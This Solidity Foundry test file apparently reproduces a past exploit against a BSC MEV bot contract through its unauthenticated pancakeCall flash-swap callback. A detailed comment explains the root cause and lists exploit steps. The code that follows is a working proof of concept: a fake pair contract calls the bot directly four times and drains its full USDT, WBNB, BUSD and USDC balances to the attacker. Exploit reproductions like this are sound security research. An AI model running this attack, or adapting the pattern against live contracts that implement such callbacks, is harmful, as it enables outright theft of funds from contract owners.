pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface MEVBot {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// VULNERABILITY: Unauthenticated Pancake V2 Flash-Swap Callback (pancakeCall) Allows Arbitrary Drains of Bot's Token Holdings
// Root cause: The external MEVBot contract (0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d) implements the IPancakeCallee.pancakeCall
// without ANY access control, sender validation, or balance-delta verification. Inside its pancakeCall it:
//   1. Reads the "pair" token via `msg.sender.token0()` (line of trust: the caller of pancakeCall is assumed to be a real IPancakePair)
//   2. Takes the flash-loan size directly from the `amount0` (or amount1) argument
//   3. Decodes the profit/transfer recipient directly from the `data` bytes (the attacker packs it as bytes12(0)+bytes20(recipient)+... so that it decodes cleanly)
//   4. Executes IERC20(token).transfer(recipient, amount) using its *own* on-contract balance of that token.
// Because the Bot accumulates substantial real balances of USDT/WBNB/BUSD/USDC (its MEV profits), an attacker who supplies a fake pair
// that returns the desired token from token0()/token1() can cause the Bot to send arbitrary (up to its full balance) quantities to any recipient.
// No capital, no real flash loan, and no repayment is needed; the bot never received the claimed `amount` because the call bypassed the pair.
// The attacker's contract also implements a no-op `swap()` because the bot's pancakeCall logic (after the transfer) performs
// `msg.sender.swap(...)` (treating the caller as the pair that must continue/repay the arb leg).
// Why the assumption fails: pancakeCall is a public external function; only the *pair* is supposed to invoke the callee after
// doing its internal safeTransfer of the output tokens. The bot never checks `factory.getPair(token0,token1) == msg.sender`,
// never checks `balanceOf(this) delta == claimedAmount`, has no owner-only guard, and treats all external callers identically.
// Code references (in this PoC that triggers it):
//   - Direct calls: Bot.pancakeCall(address(this), <fullBalance>, 0, data) at L36, L40, L44, L48
//   - Impersonation state: _token0/_token1 set to target token (L35,39,43,47) and returned by token0()/token1() (L59,63)
//   - Data packing that supplies recipient: abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))  (L37 etc.)
//   - Fake pair methods: token0 (L59), token1 (L63), swap (L65) -- all required for the bot not to revert while reading/continuing
// Impact: Complete theft of every token the bot holds. Four calls empty the contract of USDT + WBNB + BUSD + USDC. Happened on BSC @ block 21297409.
// The same pattern would work against any contract that blindly implements pancakeCall (or uniswapV2Call etc.) and performs token transfers
// based on the three untrusted inputs (msg.sender.tokenX, amountX, data-recipient).
// EXPLOIT STEPS:
// 1. Prepare impersonator contract exposing token0(), token1(), swap() (the minimal surface the bot will query/call).
// 2. For a target token T held by Bot:
//    a. Set impersonator._token0 = impersonator._token1 = T
//    b. amount = IERC20(T).balanceOf(Bot)
//    c. data = abi.encodePacked(bytes12(0), bytes20(attackerEOAorContract), bytes32(0), bytes32(0))  // recipient encoding the bot expects
//    d. Call Bot.pancakeCall(attacker, amount, 0, data)   <-- note: direct call, not via a pair.swap
// 3. Bot resolves: token = msg.sender.token0() == T; amt = amount0; to = decode(data)
// 4. Bot performs transfer(T, to, amt) -- moving its entire holding because amt == balance
// 5. Bot may call msg.sender.swap(...) which the no-op accepts without reverting.
// 6. Repeat independently for each token the bot holds (different token0 setting each time).
// 7. Attacker now owns 100% of the drained balances; no repayment or further interaction required.

contract ContractTest is Test {
    address public _token0;
    address public _token1;
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    MEVBot Bot = MEVBot(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 21_297_409);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker WBNB balance before exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker BUSD balance before exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[Start] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 18);

        uint256 USDTAmount = USDT.balanceOf(address(Bot));
        uint256 WBNBAmount = WBNB.balanceOf(address(Bot));
        uint256 BUSDAmount = BUSD.balanceOf(address(Bot));
        uint256 USDCAmount = USDC.balanceOf(address(Bot));

        (_token0, _token1) = (address(USDT), address(USDT));
        Bot.pancakeCall(
            address(this), USDTAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))
        );
        (_token0, _token1) = (address(WBNB), address(WBNB));
        Bot.pancakeCall(
            address(this), WBNBAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))
        );
        (_token0, _token1) = (address(BUSD), address(BUSD));
        Bot.pancakeCall(
            address(this), BUSDAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))
        );
        (_token0, _token1) = (address(USDC), address(USDC));
        Bot.pancakeCall(
            address(this), USDCAmount, 0, abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0))
        );

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 18);
    }

    function token0() public view returns (address) {
        return _token0;
    }

    function token1() public view returns (address) {
        return _token1;
    }

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) public {}
}
